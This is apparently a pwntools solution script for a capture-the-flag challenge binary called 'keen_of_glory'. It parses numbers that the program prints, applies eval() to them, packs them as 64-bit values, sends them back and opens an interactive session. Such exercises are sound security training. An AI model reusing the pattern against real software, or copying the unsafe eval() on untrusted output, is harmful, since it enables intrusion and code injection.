from pwn import *
p = process('keen_of_glory')
p.recvuntil('For red team, we have: ')
r = p.recvline().strip()
p.recvuntil('For blue team, we have: ')
b = p.recvline().strip()
r = r.split(' ')
b = b.split(' ')
r = map(eval,r)
b = map(eval,b)
payload = ''
for i in b:
    payload+=p64(i)
for j in r:
    payload+=p64(j)
p.send(payload)
p.interactive()